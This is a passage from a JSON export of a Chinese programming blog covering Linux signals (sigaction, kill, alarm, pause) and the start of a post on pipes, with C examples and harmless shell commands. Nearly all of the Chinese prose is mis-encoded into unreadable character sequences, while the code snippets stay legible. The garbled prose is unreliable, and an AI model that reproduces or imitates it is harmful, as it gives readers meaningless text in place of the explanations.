·çš„ååº”å‘¢ï¼Ÿå®ƒå°±ä¸ä¼šåƒæˆ‘ä»¬æƒ³åƒçš„é‚£æ ·ç”¨æˆ‘ä»¬è®¾å®šçš„å¤„ç†å‡½æ•°æ¥å¤„ç†äº†ã€‚sa_maskå°±å¯ä»¥è§£å†³è¿™æ ·çš„é—®é¢˜ï¼Œsa_maskæŒ‡å®šäº†ä¸€ä¸ªä¿¡å·é›†ï¼Œåœ¨è°ƒç”¨sa_handleræ‰€æŒ‡å‘çš„ä¿¡å·å¤„ç†å‡½æ•°ä¹‹å‰ï¼Œè¯¥ä¿¡å·é›†å°†è¢«åŠ å…¥åˆ°è¿›ç¨‹çš„ä¿¡å·å±è”½å­—ä¸­ï¼Œè®¾ç½®ä¿¡å·å±è”½å­—å¯ä»¥é˜²æ­¢ä¿¡å·åœ¨å®ƒçš„å¤„ç†å‡½æ•°è¿˜æœªè¿è¡Œç»“æŸæ—¶å°±è¢«æ¥æ”¶åˆ°çš„æƒ…å†µï¼Œå³ä½¿ç”¨sa_maskå­—æ®µå¯ä»¥æ¶ˆé™¤è¿™ä¸€ç«æ€æ¡ä»¶ã€‚ æ‰¿æ¥ä¸Šé¢çš„ä¾‹å­ï¼Œä¸‹é¢ç»™å‡ºç”¨sigaction()å‡½æ•°é‡å†™çš„ä¾‹å­ä»£ç ï¼Œæºæ–‡ä»¶ä¸ºsignal2.cï¼Œä»£ç å¦‚ä¸‹ï¼š #include &lt;unistd.h> #include &lt;stdio.h> #include &lt;signal.h> void ouch(int sig) &#123; printf(\"\\nOUCH! - I got signal %d\\n\", sig); &#125; int main() &#123; struct sigaction act; act.sa_handler = ouch; // åˆ›å»ºç©ºçš„ä¿¡å·å±è”½å­—ï¼Œå³ä¸å±è”½ä»»ä½•ä¿¡æ¯ sigemptyset(&amp;act.sa_mask); // ä½¿sigactionå‡½æ•°é‡ç½®ä¸ºé»˜è®¤è¡Œä¸º act.sa_flags = SA_RESETHAND; sigaction(SIGINT, &amp;act, 0); while(1) &#123; printf(\"Hello World!\\n\"); sleep(1); &#125; return 0; &#125; è¿è¡Œç»“æœä¸å‰ä¸€ä¸ªä¾‹å­ä¸­çš„ç›¸åŒã€‚æ³¨æ„sigactionå‡½æ•°åœ¨é»˜è®¤æƒ…å†µä¸‹æ˜¯ä¸è¢«é‡ç½®çš„ï¼Œå¦‚æœè¦æƒ³å®ƒé‡ç½®ï¼Œåˆ™sa_flagså°±è¦ä¸ºSA_RESETHANDã€‚ äº”ã€å‘é€ä¿¡å· ä¸Šé¢è¯´åˆ°çš„å‡½æ•°éƒ½æ˜¯ä¸€äº›è¿›ç¨‹æ¥æ”¶åˆ°ä¸€ä¸ªä¿¡å·ä¹‹åæ€ä¹ˆå¯¹è¿™ä¸ªä¿¡å·ä½œå‡ºååº”ï¼Œå³ä¿¡å·çš„å¤„ç†çš„é—®é¢˜ï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆå‡½æ•°å¯ä»¥å‘ä¸€ä¸ªè¿›ç¨‹ä¸»åŠ¨åœ°å‘å‡ºä¸€ä¸ªä¿¡å·å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸¤ä¸ªå‡½æ•°kill()å’Œalarm()æ¥å‘é€ä¸€ä¸ªä¿¡å·ã€‚ 1ã€kill()å‡½æ•° å…ˆæ¥çœ‹çœ‹kill()å‡½æ•°ï¼Œè¿›ç¨‹å¯ä»¥é€šè¿‡kill()å‡½æ•°å‘åŒ…æ‹¬å®ƒæœ¬èº«åœ¨å†…çš„å…¶ä»–è¿›ç¨‹å‘é€ä¸€ä¸ªä¿¡å·ï¼Œå¦‚æœç¨‹åºæ²¡æœ‰å‘é€è¿™ä¸ªä¿¡å·çš„æƒé™ï¼Œå¯¹kill()å‡½æ•°çš„è°ƒç”¨å°±å°†å¤±è´¥ï¼Œè€Œå¤±è´¥çš„å¸¸è§åŸå› æ˜¯ç›®æ ‡è¿›ç¨‹ç”±å¦ä¸€ä¸ªç”¨æˆ·æ‰€æ‹¥æœ‰ã€‚æƒ³ä¸€æƒ³ä¹Ÿæ˜¯å®¹æ˜“æ˜ç™½çš„ï¼Œä½ æ€»ä¸èƒ½æ§åˆ¶åˆ«äººçš„ç¨‹åºå§ï¼Œå½“ç„¶è¶…çº§ç”¨æˆ·rootï¼Œè¿™ç§ä¸Šå¸èˆ¬çš„å­˜åœ¨å°±é™¤å¤–äº†ã€‚ kill()å‡½æ•°çš„åŸå‹ä¸ºï¼š #include &lt;sys/types.h&gt; #include &lt;signal.h&gt; int kill(pid_t pid, int sig); å®ƒçš„ä½œç”¨æŠŠä¿¡å·sigå‘é€ç»™è¿›ç¨‹å·ä¸ºpidçš„è¿›ç¨‹ï¼ŒæˆåŠŸæ—¶è¿”å›0ã€‚ kill()è°ƒç”¨å¤±è´¥è¿”å›-1ï¼Œè°ƒç”¨å¤±è´¥é€šå¸¸æœ‰ä¸‰å¤§åŸå› ï¼š 1ã€ç»™å®šçš„ä¿¡å·æ— æ•ˆï¼ˆerrno = EINVAL) 2ã€å‘é€æƒé™ä¸å¤Ÿ( errno = EPERM ï¼‰ 3ã€ç›®æ ‡è¿›ç¨‹ä¸å­˜åœ¨( errno = ESRCH ) 2ã€alarm()å‡½æ•° è¿™ä¸ªå‡½æ•°è·Ÿå®ƒçš„åå­—ä¸€æ ·ï¼Œç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªé—¹é’Ÿçš„åŠŸèƒ½ï¼Œè¿›ç¨‹å¯ä»¥è°ƒç”¨alarm()å‡½æ•°åœ¨ç»è¿‡é¢„å®šæ—¶é—´åå‘å‘é€ä¸€ä¸ªSIGALRMä¿¡å·ã€‚ alarm()å‡½æ•°çš„å‹å¦‚ä¸‹ï¼š #include &lt;unistd.h&gt; unsigned int alarm(unsigned int seconds); alarm()å‡½æ•°ç”¨æ¥åœ¨secondsç§’ä¹‹åå®‰æ’å‘é€ä¸€ä¸ªSIGALRMä¿¡å·ï¼Œå¦‚æœsecondsä¸º0ï¼Œå°†å–æ¶ˆæ‰€æœ‰å·²è®¾ç½®çš„é—¹é’Ÿè¯·æ±‚ã€‚alarm()å‡½æ•°çš„è¿”å›å€¼æ˜¯ä»¥å‰è®¾ç½®çš„é—¹é’Ÿæ—¶é—´çš„ä½™ç•™ç§’æ•°ï¼Œå¦‚æœè¿”å›å¤±è´¥è¿”å›-1ã€‚ é©¬ä¸åœè¹„ï¼Œä¸‹é¢å°±ç»™åˆfork()ã€sleep()å’Œsignal()å‡½æ•°ï¼Œç”¨ä¸€ä¸ªä¾‹å­æ¥è¯´æ˜kill()å‡½æ•°çš„ç”¨æ³•å§ï¼Œæºæ–‡ä»¶ä¸ºsignal3.cï¼Œä»£ç å¦‚ä¸‹ï¼š #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;stdlib.h> #include &lt;stdio.h> #include &lt;signal.h> static int alarm_fired = 0; void ouch(int sig) &#123; alarm_fired = 1; &#125; int main() &#123; pid_t pid; pid = fork(); switch(pid) &#123; case -1: perror(\"fork failed\\n\"); exit(1); case 0: // å­è¿›ç¨‹ sleep(5); // å‘çˆ¶è¿›ç¨‹å‘é€ä¿¡å· kill(getppid(), SIGALRM); exit(0); default:; &#125; // è®¾ç½®å¤„ç†å‡½æ•° signal(SIGALRM, ouch); while(!alarm_fired) &#123; printf(\"Hello World!\\n\"); sleep(1); &#125; if(alarm_fired) printf(\"\\nI got a signal %d\\n\", SIGALRM); exit(0); &#125; è¿è¡Œç»“æœå¦‚ä¸‹ï¼š åœ¨ä»£ç ä¸­æˆ‘ä»¬ä½¿ç”¨fork()è°ƒç”¨å¤åˆ¶äº†ä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œåœ¨å­è¿›ç¨‹ä¸­ï¼Œ5ç§’åå‘çˆ¶è¿›ç¨‹ä¸­å‘é€ä¸€ä¸ªSIGALRMä¿¡å·ï¼Œçˆ¶è¿›ç¨‹ä¸­æ•è·è¿™ä¸ªä¿¡å·ï¼Œå¹¶ç”¨ouch()å‡½æ•°æ¥å¤„ç†ï¼Œå˜æ”¹alarm_firedçš„å€¼ï¼Œç„¶åé€€å‡ºå¾ªç¯ã€‚ä»ç»“æœä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°è¾“å‡ºäº†5ä¸ªHello Worldï¼ä¹‹åï¼Œç¨‹åºå°±æ”¶åˆ°ä¸€ä¸ªSIGARLMä¿¡å·ï¼Œç„¶åç»“æŸäº†è¿›ç¨‹ã€‚ æ³¨ï¼šå¦‚æœçˆ¶è¿›ç¨‹åœ¨å­è¿›ç¨‹çš„ä¿¡å·åˆ°æ¥ä¹‹å‰æ²¡æœ‰äº‹æƒ…å¯åšï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å‡½æ•°pause()æ¥æŒ‚èµ·çˆ¶è¿›ç¨‹ï¼Œç›´åˆ°çˆ¶è¿›ç¨‹æ¥æ”¶åˆ°ä¿¡å·ã€‚å½“è¿›ç¨‹æ¥æ”¶åˆ°ä¸€ä¸ªä¿¡å·æ—¶ï¼Œé¢„è®¾å¥½çš„ä¿¡å·å¤„ç†å‡½æ•°å°†å¼€å§‹è¿è¡Œï¼Œç¨‹åºä¹Ÿå°†æ¢å¤æ­£å¸¸çš„æ‰§è¡Œã€‚è¿™æ ·å¯ä»¥èŠ‚çœCPUçš„èµ„æºï¼Œå› ä¸ºå¯ä»¥é¿å…ä½¿ç”¨ä¸€ä¸ªå¾ªç¯æ¥ç­‰å¾…ã€‚ä»¥æœ¬ä¾‹å­ä¸ºä¾‹ï¼Œåˆ™å¯ä»¥æŠŠwhileå¾ªç¯æ”¹ä¸ºä¸€å¥pause(); ä¸‹é¢å†ä»¥ä¸€ä¸ªå°å°çš„ä¾‹å­æ¥è¯´æ˜alarmå‡½æ•°å’Œpauseå‡½æ•°çš„ç”¨æ³•å§ï¼Œæºæ–‡ä»¶åä¸ºï¼Œsignal4.cï¼Œä»£ç å¦‚ä¸‹ï¼š #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;stdlib.h> #include &lt;stdio.h> #include &lt;signal.h> static int alarm_fired = 0; void ouch(int sig) &#123; alarm_fired = 1; &#125; int main() &#123; // å…³è”ä¿¡å·å¤„ç†å‡½æ•° signal(SIGALRM, ouch); // è°ƒç”¨alarmå‡½æ•°ï¼Œ5ç§’åå‘é€ä¿¡å·SIGALRM alarm(5); // æŒ‚èµ·è¿›ç¨‹ pause(); // æ¥æ”¶åˆ°ä¿¡å·åï¼Œæ¢å¤æ­£å¸¸æ‰§è¡Œ if(alarm_fired == 1) &#123; printf(\"Receive a signal %d\\n\", SIGALRM); &#125; exit(0); &#125; è¿è¡Œç»“æœå¦‚ä¸‹ï¼š è¿›ç¨‹åœ¨5ç§’åæ¥æ”¶åˆ°ä¸€ä¸ªSIGALRMï¼Œè¿›ç¨‹æ¢å¤è¿è¡Œï¼Œæ‰“å°ä¿¡æ¯å¹¶é€€å‡ºã€‚ å…­ã€ä¿¡å·å¤„ç†å‡½æ•°çš„å®‰å…¨é—®é¢˜ è¯•æƒ³ä¸€ä¸ªé—®é¢˜ï¼Œå½“è¿›ç¨‹æ¥æ”¶åˆ°ä¸€ä¸ªä¿¡å·æ—¶ï¼Œè½¬åˆ°ä½ å…³è”çš„å‡½æ•°ä¸­æ‰§è¡Œï¼Œä½†æ˜¯åœ¨æ‰§è¡Œçš„æ—¶å€™ï¼Œè¿›ç¨‹åˆæ¥æ”¶åˆ°åŒä¸€ä¸ªä¿¡å·æˆ–å¦ä¸€ä¸ªä¿¡å·ï¼Œåˆè¦æ‰§è¡Œç›¸å…³è”çš„å‡½æ•°æ—¶ï¼Œç¨‹åºä¼šæ€ä¹ˆæ‰§è¡Œï¼Ÿ ä¹Ÿå°±æ˜¯è¯´ï¼Œä¿¡å·å¤„ç†å‡½æ•°å¯ä»¥åœ¨å…¶æ‰§è¡ŒæœŸé—´è¢«ä¸­æ–­å¹¶è¢«å†æ¬¡è°ƒç”¨ã€‚å½“è¿”å›åˆ°ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶ï¼Œå®ƒèƒ½å¦ç»§ç»­æ­£ç¡®æ“ä½œæ˜¯å¾ˆå…³é”®çš„ã€‚è¿™ä¸ä»…ä»…æ˜¯é€’å½’çš„é—®é¢˜ï¼Œè€Œæ˜¯å¯é‡å…¥çš„ï¼ˆå³å¯ä»¥å®Œå…¨åœ°è¿›å…¥å’Œå†æ¬¡æ‰§è¡Œï¼‰çš„é—®é¢˜ã€‚è€Œåè§‚Linuxï¼Œå…¶å†…æ ¸åœ¨åŒä¸€æ—¶æœŸè´Ÿè´£å¤„ç†å¤šä¸ªè®¾å¤‡çš„ä¸­æ–­æœåŠ¡ä¾‹ç¨‹å°±éœ€è¦å¯é‡å…¥çš„ï¼Œå› ä¸ºä¼˜å…ˆçº§æ›´é«˜çš„ä¸­æ–­å¯èƒ½ä¼šåœ¨åŒä¸€æ®µä»£ç çš„æ‰§è¡ŒæœŸé—´â€œæ’å…¥â€è¿›æ¥ã€‚ ç®€è¨€ä¹‹ï¼Œå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬çš„ä¿¡å·å¤„ç†å‡½æ•°è¦æ˜¯å¯é‡å…¥çš„ï¼Œå³ç¦»å¼€åå¯å†æ¬¡å®‰å…¨åœ°è¿›å…¥å’Œå†æ¬¡æ‰§è¡Œï¼Œè¦ä½¿ä¿¡å·å¤„ç†å‡½æ•°æ˜¯å¯é‡å…¥çš„ï¼Œåˆ™åœ¨ä¿¡æ¯å¤„ç†å‡½æ•°ä¸­ä¸èƒ½è°ƒç”¨ä¸å¯é‡å…¥çš„å‡½æ•°ã€‚ä¸‹é¢ç»™å‡ºå¯é‡å…¥çš„å‡½æ•°åœ¨åˆ—è¡¨ï¼Œä¸åœ¨æ­¤è¡¨ä¸­çš„å‡½æ•°éƒ½æ˜¯ä¸å¯é‡å…¥çš„ï¼Œå¯é‡å…¥å‡½æ•°è¡¨å¦‚ä¸‹ï¼š ä¸ƒã€é™„å½• â€”â€” ä¿¡å·è¡¨ å¦‚æœè¿›ç¨‹æ¥æ”¶åˆ°ä¸Šé¢è¿™äº›ä¿¡å·ä¸­çš„ä¸€ä¸ªï¼Œè€Œäº‹å…ˆåˆæ²¡æœ‰å®‰æ’æ•è·å®ƒï¼Œè¿›ç¨‹å°±ä¼šç»ˆæ­¢ã€‚ è¿˜æœ‰å…¶ä»–çš„ä¸€äº›ä¿¡å·ï¼Œå¦‚ä¸‹ï¼š pause()å‡½æ•°ï¼šè®©è¿›ç¨‹æš‚åœç›´åˆ°ä¿¡å·å‡ºç° pauseï¼ˆè®©è¿›ç¨‹æš‚åœç›´åˆ°ä¿¡å·å‡ºç°ï¼‰ ç›¸å…³å‡½æ•° killï¼Œsignalï¼Œsleep è¡¨å¤´æ–‡ä»¶ #include &lt;unistd.h&gt; å®šä¹‰å‡½æ•° int pause(void); å‡½æ•°è¯´æ˜ pause()ä¼šä»¤ç›®å‰çš„è¿›ç¨‹æš‚åœï¼ˆè¿›å…¥ç¡çœ çŠ¶æ€ï¼‰ï¼Œç›´åˆ°è¢«ä¿¡å·(signal)æ‰€ä¸­æ–­ã€‚ è¿”å›å€¼ åªè¿”å›-1ã€‚ é”™è¯¯ä»£ç  EINTR æœ‰ä¿¡å·åˆ°è¾¾ä¸­æ–­äº†æ­¤å‡½æ•°ã€‚ å‚è€ƒï¼š http://blog.csdn.net/ljianhui/article/details/10128731 ã€ŠLinux é«˜æ€§èƒ½æœåŠ¡å™¨ç¼–ç¨‹ã€‹","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Linux","slug":"æŠ€æœ¯å‘/Linux","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.sizaif.com/tags/Linux/"},{"name":"é€šä¿¡","slug":"é€šä¿¡","permalink":"https://www.sizaif.com/tags/%E9%80%9A%E4%BF%A1/"}],"author":"sizaif"},{"title":"Linux çš„è¿›ç¨‹é—´é€šä¿¡ï¼šç®¡é“","slug":"Linux-çš„è¿›ç¨‹é—´é€šä¿¡ï¼šç®¡é“","date":"2022-05-25T07:35:14.000Z","updated":"2022-05-25T07:39:08.531Z","comments":true,"path":"posts/4502c3a8/","link":"","permalink":"https://www.sizaif.com/posts/4502c3a8/","excerpt":"","text":"å‰è¨€ ç®¡é“æ˜¯UNIXç¯å¢ƒä¸­å†å²æœ€æ‚ ä¹…çš„è¿›ç¨‹é—´é€šä¿¡æ–¹å¼ã€‚æœ¬æ–‡ä¸»è¦è¯´æ˜åœ¨Linuxç¯å¢ƒä¸Šå¦‚ä½•ä½¿ç”¨ç®¡é“ã€‚é˜…è¯»æœ¬æ–‡å¯ä»¥å¸®ä½ è§£å†³ä»¥ä¸‹é—®é¢˜ï¼š ä»€ä¹ˆæ˜¯ç®¡é“å’Œä¸ºä»€ä¹ˆè¦æœ‰ç®¡é“ï¼Ÿ ç®¡é“æ€ä¹ˆåˆ†ç±»ï¼Ÿ ç®¡é“çš„å®ç°æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿ ç®¡é“æœ‰å¤šå¤§ï¼Ÿ ç®¡é“çš„å¤§å°æ˜¯ä¸æ˜¯å¯ä»¥è°ƒæ•´ï¼Ÿå¦‚ä½•è°ƒæ•´ï¼Ÿ ä»€ä¹ˆæ˜¯ç®¡é“ï¼Ÿ ç®¡é“ï¼Œè‹±æ–‡ä¸ºpipeã€‚è¿™æ˜¯ä¸€ä¸ªæˆ‘ä»¬åœ¨å­¦ä¹ Linuxå‘½ä»¤è¡Œçš„æ—¶å€™å°±ä¼šå¼•å…¥çš„ä¸€ä¸ªå¾ˆé‡è¦çš„æ¦‚å¿µã€‚å®ƒçš„å‘æ˜äººæ˜¯é“æ ¼æ‹‰æ–¯.éº¦å…‹ç½—ä¼Šï¼Œè¿™ä½ä¹Ÿæ˜¯UNIXä¸Šæ—©æœŸshellçš„å‘æ˜äººã€‚ä»–åœ¨å‘æ˜äº†shellä¹‹åï¼Œå‘ç°ç³»ç»Ÿæ“ä½œæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ï¼Œç»å¸¸æœ‰éœ€æ±‚è¦å°†ä¸€ä¸ªç¨‹åºçš„è¾“å‡ºäº¤ç»™å¦ä¸€ä¸ªç¨‹åºè¿›è¡Œå¤„ç†ï¼Œè¿™ç§æ“ä½œå¯ä»¥ä½¿ç”¨è¾“å…¥è¾“å‡ºé‡å®šå‘åŠ æ–‡ä»¶æå®šï¼Œæ¯”å¦‚ï¼š [zorro@zorro-pc pipe]$ ls -l /etc/ > etc.txt [zorro@zorro-pc pipe]$ wc -l etc.txt 183 etc.txt ä½†æ˜¯è¿™æ ·æœªå…æ˜¾å¾—å¤ªéº»çƒ¦äº†ã€‚æ‰€ä»¥ï¼Œç®¡é“çš„æ¦‚å¿µåº”è¿è€Œç”Ÿã€‚ç›®å‰åœ¨ä»»ä½•ä¸€ä¸ªshellä¸­ï¼Œéƒ½å¯ä»¥ä½¿ç”¨â€œ|â€è¿æ¥ä¸¤ä¸ªå‘½ä»¤ï¼Œshellä¼šå°†å‰åä¸¤ä¸ªè¿›ç¨‹çš„è¾“å…¥è¾“å‡ºç”¨ä¸€ä¸ªç®¡é“ç›¸è¿ï¼Œä»¥ä¾¿è¾¾åˆ°è¿›ç¨‹é—´é€šä¿¡çš„ç›®çš„ï¼š [zorro@zorro-pc pipe]$ ls -l /etc/ | wc -l 183 å¯¹æ¯”ä»¥ä¸Šä¸¤ç§æ–¹æ³•ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç†è§£ä¸ºï¼Œç®¡é“æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œå‰é¢çš„è¿›ç¨‹ä»¥å†™æ–¹å¼æ‰“å¼€æ–‡ä»¶ï¼Œåé¢çš„è¿›ç¨‹ä»¥è¯»æ–¹å¼æ‰“å¼€ã€‚è¿™æ ·å‰é¢å†™å®Œåé¢è¯»ï¼Œäºæ˜¯å°±å®ç°äº†é€šä¿¡ã€‚å®é™…ä¸Šç®¡é“çš„è®¾è®¡ä¹Ÿæ˜¯éµå¾ªUNIXçš„â€œä¸€åˆ‡çš†æ–‡ä»¶â€è®¾è®¡åŸåˆ™çš„ï¼Œå®ƒæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªæ–‡ä»¶ã€‚Linuxç³»ç»Ÿç›´æ¥æŠŠç®¡é“å®ç°æˆäº†ä¸€ç§æ–‡ä»¶ç³»ç»Ÿï¼Œå€ŸåŠ©VFSç»™åº”ç”¨ç¨‹åºæä¾›æ“ä½œæ¥å£ã€‚ è™½ç„¶å®ç°å½¢æ€ä¸Šæ˜¯æ–‡ä»¶ï¼Œä½†æ˜¯ç®¡é“æœ¬èº«å¹¶ä¸å ç”¨ç£ç›˜æˆ–è€…å…¶ä»–å¤–éƒ¨å­˜å‚¨çš„ç©ºé—´ã€‚åœ¨Linuxçš„å®ç°ä¸Šï¼Œå®ƒå ç”¨çš„æ˜¯å†…å­˜ç©ºé—´ã€‚æ‰€ä»¥ï¼ŒLinuxä¸Šçš„ç®¡é“å°±æ˜¯ä¸€ä¸ªæ“ä½œæ–¹å¼ä¸ºæ–‡ä»¶çš„å†…å­˜ç¼“å†²åŒºã€‚ ç®¡é“çš„åˆ†ç±»å’Œä½¿ç”¨ Linuxä¸Šçš„ç®¡é“åˆ†ä¸¤ç§ç±»å‹ï¼š åŒ¿åç®¡é“ å‘½åç®¡é“ è¿™ä¸¤ç§ç®¡é“ä¹Ÿå«åšæœ‰åæˆ–æ— åç®¡é“ã€‚åŒ¿åç®¡é“æœ€å¸¸è§çš„å½¢æ€å°±æ˜¯æˆ‘ä»¬åœ¨shellæ“ä½œä¸­æœ€å¸¸ç”¨çš„â€|â€ã€‚å®ƒçš„ç‰¹ç‚¹æ˜¯åªèƒ½åœ¨çˆ¶å­è¿›ç¨‹ä¸­ä½¿ç”¨ï¼Œçˆ¶è¿›ç¨‹åœ¨äº§ç”Ÿå­è¿›ç¨‹å‰å¿…é¡»æ‰“å¼€ä¸€ä¸ªç®¡é“æ–‡ä»¶ï¼Œç„¶åforkäº§ç”Ÿå­è¿›ç¨‹ï¼Œè¿™æ ·å­è¿›ç¨‹é€šè¿‡æ‹·è´çˆ¶è¿›ç¨‹çš„è¿›ç¨‹åœ°å€ç©ºé—´è·å¾—åŒä¸€ä¸ªç®¡é“æ–‡ä»¶çš„æè¿°ç¬¦ï¼Œä»¥è¾¾åˆ°ä½¿ç”¨åŒä¸€ä¸ªç®¡é“é€šä¿¡çš„ç›®çš„ã€‚æ­¤æ—¶é™¤äº†çˆ¶å­è¿›ç¨‹å¤–ï¼Œæ²¡äººçŸ¥é“è¿™ä¸ªç®¡é“æ–‡ä»¶çš„æè¿°ç¬¦ï¼Œæ‰€ä»¥é€šè¿‡è¿™ä¸ªç®¡é“ä¸­çš„ä¿¡æ¯æ— æ³•ä¼ é€’ç»™å…¶ä»–è¿›ç¨‹ã€‚è¿™ä¿è¯äº†ä¼ è¾“æ•°æ®çš„å®‰å…¨æ€§ï¼Œå½“ç„¶ä¹Ÿé™ä½äº†ç®¡é“äº†é€šç”¨æ€§ï¼Œäºæ˜¯ç³»ç»Ÿè¿˜æä¾›äº†å‘½åç®¡é“ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨mkfifoæˆ–mknodå‘½ä»¤æ¥åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“ï¼Œè¿™è·Ÿåˆ›å»ºä¸€ä¸ªæ–‡ä»¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼š [zorro@zorro-pc pipe]$ mkfifo pipe [zorro@zorro-pc pipe]$ ls -l pipe prw-r--r-- 1 zorro zorro 0 Jul 14 10:44 pipe å¯ä»¥çœ‹åˆ°åˆ›å»ºå‡ºæ¥çš„æ–‡ä»¶ç±»å‹æ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯pç±»å‹ã€‚è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªç®¡é“æ–‡ä»¶ã€‚æœ‰äº†è¿™ä¸ªç®¡é“æ–‡ä»¶ï¼Œç³»ç»Ÿä¸­å°±æœ‰äº†å¯¹ä¸€ä¸ªç®¡é“çš„å…¨å±€åç§°ï¼Œäºæ˜¯ä»»ä½•ä¸¤ä¸ªä¸ç›¸å…³çš„è¿›ç¨‹éƒ½å¯ä»¥é€šè¿‡è¿™ä¸ªç®¡é“æ–‡ä»¶è¿›è¡Œé€šä¿¡äº†ã€‚æ¯”å¦‚æˆ‘ä»¬ç°åœ¨è®©ä¸€ä¸ªè¿›ç¨‹å†™è¿™ä¸ªç®¡é“æ–‡ä»¶ï¼š [zorro@zorro-pc pipe]$ echo xxxxxxxxxxxxxx > pipe æ­¤æ—¶è¿™ä¸ªå†™æ“ä½œä¼šé˜»å¡ï¼Œå› ä¸ºç®¡é“å¦ä¸€ç«¯æ²¡æœ‰äººè¯»ã€‚è¿™æ˜¯å†…æ ¸å¯¹ç®¡é“æ–‡ä»¶å®šä¹‰çš„é»˜è®¤è¡Œä¸ºã€‚æ­¤æ—¶å¦‚æœæœ‰è¿›ç¨‹è¯»è¿™ä¸ªç®¡é“ï¼Œé‚£ä¹ˆè¿™ä¸ªå†™æ“ä½œçš„é˜»å¡æ‰ä¼šè§£é™¤ï¼š [zorro@zorro-pc pipe]$ cat pipe xxxxxxxxxxxxxx å¤§å®¶å¯ä»¥è§‚å¯Ÿåˆ°ï¼Œå½“æˆ‘ä»¬catå®Œè¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œå¦ä¸€ç«¯çš„echoå‘½ä»¤ä¹Ÿè¿”å›äº†ã€‚è¿™å°±æ˜¯å‘½åç®¡é“ã€‚ Linuxç³»ç»Ÿæ— è®ºå¯¹äºå‘½åç®¡é“å’ŒåŒ¿åç®¡é“ï¼Œåº•å±‚éƒ½ç”¨çš„æ˜¯åŒä¸€ç§æ–‡ä»¶ç³»ç»Ÿçš„æ“ä½œè¡Œä¸ºï¼Œè¿™ç§æ–‡ä»¶ç³»ç»Ÿå«pipefsã€‚å¤§å®¶å¯ä»¥åœ¨/etc/proc/filesystemsæ–‡ä»¶ä¸­æ‰¾åˆ°ä½ çš„ç³»ç»Ÿæ˜¯ä¸æ˜¯æ”¯æŒè¿™ç§æ–‡ä»¶ç³»ç»Ÿï¼š [zorro@zorro-pc pipe]$ cat /proc/filesystems |grep pipefs nodev pipefs è§‚å¯Ÿå®Œäº†å¦‚ä½•åœ¨å‘½ä»¤è¡Œä¸­ä½¿ç”¨ç®¡é“ä¹‹åï¼Œæˆ‘ä»¬å†æ¥çœ‹çœ‹å¦‚ä½•åœ¨ç³»ç»Ÿç¼–ç¨‹ä¸­ä½¿ç”¨ç®¡é“ã€‚ PIPE æˆ‘ä»¬å¯ä»¥æŠŠåŒ¿åç®¡é“å’Œå‘½åç®¡é“åˆ†åˆ«å«åšPIPEå’ŒFIFOã€‚è¿™ä¸»è¦å› ä¸ºåœ¨ç³»ç»Ÿç¼–ç¨‹ä¸­ï¼Œåˆ›å»ºåŒ¿åç®¡é“çš„ç³»ç»Ÿè°ƒç”¨æ˜¯pipe()ï¼Œè€Œåˆ›å»ºå‘½åç®¡é“çš„å‡½æ•°æ˜¯mkfifo()ã€‚ä½¿ç”¨mknod()ç³»ç»Ÿè°ƒç”¨å¹¶æŒ‡å®šæ–‡ä»¶ç±»å‹ä¸ºä¸ºS_IFIFOä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ªFIFOã€‚ ä½¿ç”¨pipe()ç³»ç»Ÿè°ƒç”¨å¯ä»¥åˆ›å»ºä¸€ä¸ªåŒ¿åç®¡é“ï¼Œè¿™ä¸ªç³»ç»Ÿè°ƒç”¨çš„åŸå‹ä¸ºï¼š #include &lt;unistd.h> int pipe(int pipefd[2]); è¿™ä¸ªæ–¹æ³•å°†ä¼šåˆ›å»ºå‡ºä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œå¯ä»¥ä½¿ç”¨pipefdè¿™ä¸ªæ•°ç»„æ¥å¼•ç”¨è¿™ä¸¤ä¸ªæè¿°ç¬¦è¿›è¡Œæ–‡ä»¶æ“ä½œã€‚pipefd[0]æ˜¯è¯»æ–¹å¼æ‰“å¼€ï¼Œä½œä¸ºç®¡é“çš„è¯»æè¿°ç¬¦ã€‚pipefd[1]æ˜¯å†™æ–¹å¼æ‰“å¼€ï¼Œä½œä¸ºç®¡é“çš„å†™æè¿°ç¬¦ã€‚ä»ç®¡é“å†™ç«¯å†™å…¥çš„æ•°æ®ä¼šè¢«å†…æ ¸ç¼“å­˜ç›´åˆ°æœ‰äººä»å¦ä¸€ç«¯è¯»å–ä¸ºæ­¢ã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å¦‚ä½•åœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­ä½¿ç”¨ç®¡é“ï¼Œè™½ç„¶è¿™ä¸ªä¾‹å­å¹¶æ²¡æœ‰ä»€ä¹ˆæ„ä¹‰ï¼š [zorro@zorro-pc pipe]$ cat pipe.c #include &lt;stdlib.h> #include &lt;stdio.h> #include &lt;unistd.h> #include &lt;string.h> #define STRING \"hello world!\" int main() &#123; int pipefd[2]; char buf[BUFSIZ]; if (pipe(pipefd) == -1) &#123; perror(\"pipe()\"); exit(1); &#125; 